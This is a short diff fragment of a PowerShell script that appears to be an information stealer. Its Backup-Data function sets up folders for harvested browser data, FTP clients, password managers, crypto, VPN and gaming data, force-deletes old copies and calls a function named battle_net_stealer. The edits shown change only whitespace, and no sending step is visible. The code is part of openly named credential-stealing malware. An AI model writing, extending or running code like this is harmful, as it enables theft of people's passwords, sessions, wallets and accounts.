@@ -144,7 +144,7 @@ function Backup-Data {
     $important_files = "$folderformat\Important Files"
     $browser_data = "$folderformat\Browser Data"
     $ftp_clients = "$folderformat\FTP Clients"
-	$password_managers = "$folderformat\Password Managers"
+	$password_managers = "$folderformat\Password Managers" 
 
     $folders = @($folder_general, $folder_messaging, $folder_gaming, $folder_crypto, $folder_vpn, $folder_email, $important_files, $browser_data, $ftp_clients)
     foreach ($folder in $folders) { if (Test-Path $folder) { Remove-Item $folder -Recurse -Force } }
@@ -583,7 +583,6 @@ function Backup-Data {
         }
     }
     battle_net_stealer
-
 
     # All VPN Sessions
 
